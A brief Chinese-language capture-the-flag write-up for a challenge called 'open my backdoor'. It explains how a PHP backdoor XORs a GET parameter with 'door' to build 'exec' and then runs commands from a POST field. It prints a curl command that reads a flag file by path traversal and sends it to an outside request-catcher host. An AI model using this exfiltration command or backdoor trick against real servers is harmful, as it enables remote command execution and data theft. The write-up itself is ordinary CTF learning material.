# open my backdoor

點進題目就可以看到一段 php 的 code，花了一些時間理解後解題思路就出來了，基本上就是透過 GET[87] 中的字串與 door 經過 xor 後得到 exec，接著執行 POST["#"] 中的內容。

第一個踩到的坑是以為程式裡面的第2行是從 `<?php` 開始算。
第二個坑是不知道 GET 裡面要用 uri encode。

再來就是如何把指令回傳的結果傳回來，因為指令是在server上跑的，google 一下後發現有 request receiver 這種東西，就不用自己架一個 server，接著就容易了，丟給 POST["#"]:
```
curl -X POST -d $(cat ../../../flag_is_here) \ 
https://stillfantasy.requestcatcher.com/test
```
即可得到 flag，至於 flag 的路徑可以透過 ls 取代上方 cat 指令慢慢搜索即可得到。
